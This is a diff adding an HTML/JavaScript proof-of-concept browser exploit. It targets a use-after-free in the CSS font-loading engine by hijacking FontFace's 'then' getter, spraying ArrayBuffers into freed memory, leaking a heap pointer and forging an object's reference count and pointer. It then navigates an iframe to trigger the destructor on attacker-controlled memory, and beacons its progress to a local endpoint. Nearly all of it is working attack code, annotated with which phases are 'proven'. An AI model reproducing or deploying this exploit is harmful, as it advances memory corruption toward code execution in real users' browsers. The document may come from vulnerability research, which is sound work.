@@ -1,0 +1,262 @@
+<!--
+  p656f: hybrid — forge in MAIN doc (proven), release via IFRAME nav
+
+  Evidence matrix (this console):
+    p656b: forge CONFIRMED in MAIN doc (fonts.load + delete(this))
+    p656c: fonts.clear() does NOT release the pending +1 (main doc)
+    p655:  iframe navigation releases ALL refs deterministically
+    p656e: forge inside iframe FAILS — engine overwrites +0x58 with a fresh
+           table (T2), different pipeline stage at trap time
+
+  v3 hybrid:
+    Phase 1 (main): UAF -> T1 leak                [proven pattern]
+    Phase 2 (main): forge +0x58=T1, rc seed 0     [proven pattern]
+    Phase 3 (NEW):  move ffB + its <style> into a hidden iframe, then
+                    navigate iframe -> releases the load-machinery refs
+                    of BOTH faces (they live in the iframe document)
+    Then parent polls dv1/dv2 for destructor/free verdicts.
+
+  Key trick: ffB (phase-2 trigger face) is CREATED INSIDE THE IFRAME from
+  the start, so its CSSFontFace + load requests belong to the iframe
+  document. Teardown of the iframe must release those refs.
+
+  Question this answers: was the +1 ref on our forged face held by the
+  iframe-owned load machinery? If yes -> rc drops to 0 -> destructor on
+  our buffer (D2 DESTROYED/FREED verdicts).
+
+  CRASH_CLASS: HIGH
+-->
+<!DOCTYPE html><html><head><meta charset="utf-8"><title>p656f</title></head>
+<body>p656f: hybrid forge + iframe release
+<pre id="log" style="color:#0f0;background:#000;font:12px monospace;padding:8px;white-space:pre-wrap"></pre>
+<script>
+(function() {
+'use strict';
+var L = document.getElementById('log');
+var bQ = [];
+
+function emit(tag, msg) {
+  var s = tag + (msg ? ' ' + msg : '');
+  L.textContent += s + '\n';
+  bQ.push(s);
+  if (bQ.length >= 2) flush();
+}
+function flush() {
+  if (!bQ.length) return;
+  var b = bQ.splice(0, 4).join('|');
+  try { var x = new XMLHttpRequest(); x.open('GET', '/beacon/P656F-' + encodeURIComponent(b), false); x.send(); } catch(e) {}
+}
+window.onerror = function(m) { emit('ERR', String(m).slice(0,120)); flush(); };
+
+function hex32(v) { return ('00000000' + (v >>> 0).toString(16)).slice(-8); }
+
+emit('START', 'hybrid-v3');
+flush();
+
+// ============ PHASE 1 + 2 in MAIN doc (proven p656b pattern) ============
+var bufs1 = [], bufs2 = [];
+var T1_lo = 0, T1_hi = 0;
+var hit1 = -1, hit2 = -1;
+var phase = 0;
+
+var sty1 = document.createElement('style');
+sty1.textContent = "@font-face { font-family: sa; src: local(Arial); unicode-range: U+0042; }";
+document.head.appendChild(sty1);
+
+var ffA = new FontFace('fa', 'local(Helvetica)', { unicodeRange: 'U+0041' });
+document.fonts.add(ffA);
+void ffA.loaded;
+
+var sty2 = document.createElement('style');
+sty2.textContent = "@font-face { font-family: sb; src: local(Arial); unicode-range: U+0043; }";
+document.head.appendChild(sty2);
+
+var ffB = new FontFace('fb', 'local(Helvetica)', { unicodeRange: 'U+0044' });
+document.fonts.add(ffB);
+void ffB.loaded;
+
+Object.defineProperty(FontFace.prototype, 'then', {
+  configurable: true,
+  get: function() {
+    if (phase === 1) {
+      phase = 0;
+      sty1.remove();
+      try { document.fonts.delete(this); } catch(e) {}
+      document.body.offsetHeight;
+      for (var i = 0; i < 80; i++) {
+        var ab = new ArrayBuffer(192);
+        var dv = new DataView(ab);
+        dv.setUint32(0x00, 2, true);
+        dv.setUint32(0x04, 0xAAAA0001, true);
+        bufs1.push({ dv: dv });
+      }
+      emit('TRAP1', 'spray=80');
+      return undefined;
+    }
+    if (phase === 2) {
+      phase = 0;
+      sty2.remove();
+      try { document.fonts.delete(this); } catch(e) {}
+      document.body.offsetHeight;
+      for (var i = 0; i < 80; i++) {
+        var ab = new ArrayBuffer(192);
+        var dv = new DataView(ab);
+        dv.setUint32(0x00, 0, true);        // seed 0 -> rc 1 after addClient
+        dv.setUint32(0x04, 0xCCCC0006, true);
+        dv.setUint32(0x58, T1_lo, true);    // FORGE
+        dv.setUint32(0x5C, T1_hi, true);
+        bufs2.push({ dv: dv });
+      }
+      emit('TRAP2', 'spray=80 forge=T1');
+      return undefined;
+    }
+    return undefined;
+  },
+  set: function() {}
+});
+
+phase = 1;
+document.fonts.load('1em fa, sa', 'AB');
+
+setTimeout(function() {
+try {
+  hit1 = -1;
+  for (var i = 0; i < bufs1.length; i++) {
+    if (bufs1[i].dv.getUint32(0, true) !== 2) { hit1 = i; break; }
+  }
+  if (hit1 < 0) {
+    for (var j = 0; j < bufs1.length; j++) {
+      if (bufs1[j].dv.getUint32(0x58, true) !== 0 || bufs1[j].dv.getUint32(0x5C, true) !== 0) { hit1 = j; break; }
+    }
+  }
+  if (hit1 < 0) { emit('P1-MISS', 'stop'); flush(); return; }
+
+  var dv1 = bufs1[hit1].dv;
+  T1_lo = dv1.getUint32(0x58, true);
+  T1_hi = dv1.getUint32(0x5C, true);
+  emit('P1-HIT', 'hit=' + hit1 + ' T1=' + hex32(T1_hi) + hex32(T1_lo));
+  flush();
+  if (!T1_lo && !T1_hi) { emit('P1-FAIL', 'T1 null'); flush(); return; }
+
+  phase = 2;
+  document.fonts.load('1em fb, sb', 'CD');
+
+  setTimeout(function() {
+  try {
+    hit2 = -1;
+    for (var i = 0; i < bufs2.length; i++) {
+      if (bufs2[i].dv.getUint32(0, true) !== 0) { hit2 = i; break; }
+    }
+    if (hit2 < 0) {
+      for (var j = 0; j < bufs2.length; j++) {
+        if (bufs2[j].dv.getUint32(0x68, true) !== 0 || bufs2[j].dv.getUint32(0x6C, true) !== 0) { hit2 = j; break; }
+      }
+    }
+    if (hit2 < 0) { emit('P2-MISS', 'stop'); flush(); return; }
+
+    var dv2 = bufs2[hit2].dv;
+    var rc2 = dv2.getUint32(0, true);
+    var held = (dv2.getUint32(0x58, true) === T1_lo && dv2.getUint32(0x5C, true) === T1_hi);
+    emit('P2-HIT', 'hit=' + hit2 + ' rc=' + rc2 + ' forge=' + held);
+    flush();
+    if (!held) { emit('FORGE-FAIL', 'stop'); flush(); return; }
+
+    // ============ PHASE 3: iframe takeover + release ============
+    // Move ffB into an iframe's FontFaceSet by deleting from main and
+    // adding inside iframe context. The load-machinery refs follow the
+    // face into the iframe document; navigating releases them.
+    var ifr = document.createElement('iframe');
+    ifr.style.display = 'none';
+    document.body.appendChild(ifr);
+
+    try {
+      document.fonts.delete(ffB);   // remove from main set (drops membership ref)
+    } catch(e) { emit('DEL-FFB', 'ERR:' + String(e).slice(0,40)); }
+
+    try {
+      ifr.contentDocument.fonts.add(ffB);   // face now owned by iframe doc
+      emit('IFRAME', 'ffB adopted by iframe set');
+    } catch(e) { emit('IFRAME', 'ERR:' + String(e).slice(0,60)); flush(); return; }
+
+    var snap1 = [], snap2 = [];
+    for (var j = 0; j < 192; j += 4) { snap1.push(dv1.getUint32(j, true)); snap2.push(dv2.getUint32(j, true)); }
+
+    emit('PRE-NAV', 'rc1=' + dv1.getUint32(0, true) + ' rc2=' + dv2.getUint32(0, true));
+    flush();
+
+    ifr.contentWindow.location.replace('about:blank');
+    emit('NAV', 'sent');
+    flush();
+
+    setTimeout(function() {
+      try { ifr.remove(); } catch(e) {}
+      ifr = null;
+
+      var fresh = [];
+      var pollN = 0;
+      var s1 = { changed: false, freed: false }, s2 = { changed: false, freed: false };
+
+      function poll() {
+        pollN++;
+        for (var k = 0; k < 8; k++) {
+          var ab = new ArrayBuffer(192);
+          var dvf = new DataView(ab);
+          dvf.setUint32(0x04, 0xF7EE0660, true);
+          fresh.push(dvf);
+        }
+
+        function check(dv, snap, label, st) {
+          var rc = dv.getUint32(0, true);
+          var mk = dv.getUint32(4, true);
+          var changed = [];
+          for (var j = 0; j < 192; j += 4) {
+            var cur = dv.getUint32(j, true);
+            if (cur !== snap[j / 4]) {
+              changed.push('+' + j.toString(16) + ':' + hex32(snap[j/4]) + '>' + hex32(cur));
+              snap[j / 4] = cur;
+            }
+          }
+          if (mk === 0xF7EE0660 && !st.freed) {
+            st.freed = true;
+            emit(label + '-FREED', 'slot re-taken by fresh spray');
+          } else if (changed.length && !st.changed) {
+            st.changed = true;
+            emit(label + '-CHANGED', 'rc=' + rc + ' diffs=' + changed.length);
+            emit(label + '-DIFFS', changed.slice(0, 12).join(' '));
+            var full = [];
+            for (var j2 = 0; j2 < 192; j2 += 8) {
+              full.push('+' + j2.toString(16) + '=' + hex32(dv.getUint32(j2+4, true)) + hex32(dv.getUint32(j2, true)));
+            }
+            emit(label + '-FULL', full.join(' '));
+          }
+        }
+
+        check(dv1, snap1, 'D1', s1);
+        check(dv2, snap2, 'D2', s2);
+
+        if (pollN === 1 || pollN === 5 || pollN === 15 || pollN === 30) {
+          emit('POLL', 'n=' + pollN + ' d1rc=' + dv1.getUint32(0,true) + ' d2rc=' + dv2.getUint32(0,true));
+          flush();
+        }
+
+        if (pollN < 40) { setTimeout(poll, 100); }
+        else {
+          emit('VERDICT',
+            'D1 ' + (s1.freed ? 'FREED' : s1.changed ? 'DESTROYED' : 'STABLE') +
+            ' | D2 ' + (s2.freed ? 'FREED' : s2.changed ? 'DESTROYED' : 'STABLE'));
+          emit('ALIVE', 'end');
+          flush();
+        }
+      }
+      setTimeout(poll, 80);
+    }, 600);
+
+  } catch(e2) { emit('P2-FATAL', String(e2).slice(0,150)); flush(); }
+  }, 150);
+
+} catch(e1) { emit('P1-FATAL', String(e1).slice(0,150)); flush(); }
+}, 100);
+
+})();
+</script>
+</body></html>
